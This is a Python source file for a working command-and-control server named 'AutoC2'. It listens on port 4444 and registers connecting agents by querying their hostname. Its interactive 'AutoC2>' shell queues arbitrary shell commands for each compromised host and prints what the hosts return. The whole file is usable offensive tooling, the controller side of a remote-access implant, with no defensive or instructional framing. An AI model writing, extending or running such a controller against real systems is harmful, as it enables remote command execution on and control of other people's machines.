import socket
import threading
import queue
import readline

# Server IP and port configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Queue to store commands for each client
command_queue = queue.Queue()

# Keep track of registered agents
registered_addresses = set()
registered_agents_id = [None] # Lookup by id
registered_agents_ip = {} # Lookup by ip
curr_id = 1
class Agent:
    def __init__(self, id, ip, hostname):
        self.id = id
        self.ip = ip
        self.hostname = hostname
        self.command_queue = queue.Queue()

# Function to handle client connections
def handle_client(client_socket, client_address):
    if client_address[0] not in registered_addresses:
        try:
            # Get hostname
            command = "hostname" + "\n"
            print(f"[+] Sending command to {client_address}: {command}")
            client_socket.sendall(command.encode())

            # Receive output from the client until the delimiter
            buffer = b''
            while b'ac2delim' not in buffer:
                data = client_socket.recv(4096)
                if not data:
                    break  # Exit if client closes the connection
                buffer += data
            
            # Extract output
            output = buffer.partition(b'ac2delim')[0].decode()
            
            # Register the agent
            registered_addresses.add(client_address[0])
            global curr_id
            new_agent = Agent(curr_id, client_address[0], output.strip())
            curr_id += 1
            registered_agents_id.append(new_agent)
            registered_agents_ip[client_address[0]] = new_agent
            print(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")

        except Exception as e:
            print(f"[!] Error with client {client_address}: {e}")
        finally:
            print(f"[-] Connection closed for {client_address}")
            client_socket.close()
    else:
        try:
            agent = registered_agents_ip[client_address[0]]
            while True:
                # Check if there are commands in the queue for the agent
                if not agent.command_queue.empty():
                    # Get the next command from the queue
                    command = agent.command_queue.get()
                    print(f"[+] Sending command to {client_address}: {command}")
                    client_socket.sendall(command.encode())

                    # Receive output from the client until the delimiter
                    buffer = b''
                    while b'ac2delim' not in buffer:
                        data = client_socket.recv(4096)
                        if not data:
                            break  # Exit if client closes the connection
                        buffer += data
                    
                    # Extract and display the output up to the delimiter
                    output = buffer.partition(b'ac2delim')[0].decode()
                    print(f"Output from {client_address}:\n{output}")
                else:
                    break
        except Exception as e:
            print(f"[!] Error with client {client_address}: {e}")
        finally:
            print(f"[-] Connection closed for {client_address}")
            client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()
    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            print(f"[+] Accepted connection from {client_address}")
            
            # Create a new thread to handle each client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down the server.")
    finally:
        server_socket.close()

def AutoC2_shell():
    # Custom shell to interact with agents by adding commands to the queue
    while True:
        command = input("AutoC2> ")
        split_command = command.split()
        
        # Blank command
        if not command.strip():
            continue
        
        # Exit the shell
        if command.lower() in ["exit", "quit"]:
            print("[*] Exiting AutoC2 shell.")
            break

        # Show agents
        if command == "show_agents":
            for agent in registered_agents_ip.values():
                print(f"{agent.id} : {agent.hostname} ({agent.ip})")

        # Queue a command
        if len(split_command) > 2:
            if split_command[0] == "command":
                agent_id = int(split_command[1])
                cmd = " ".join(split_command[2:])
                if agent_id < curr_id:
                    print(f"[+] Queuing command for agent {agent_id}: {cmd}")
                    agent = registered_agents_id[agent_id]
                    agent.command_queue.put(cmd + "\n")

def main():
    # Start server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Run the shell in the main thread
    try:
        AutoC2_shell()
    finally:
        print("[*] Server has been stopped.")

if __name__ == "__main__":
    main()
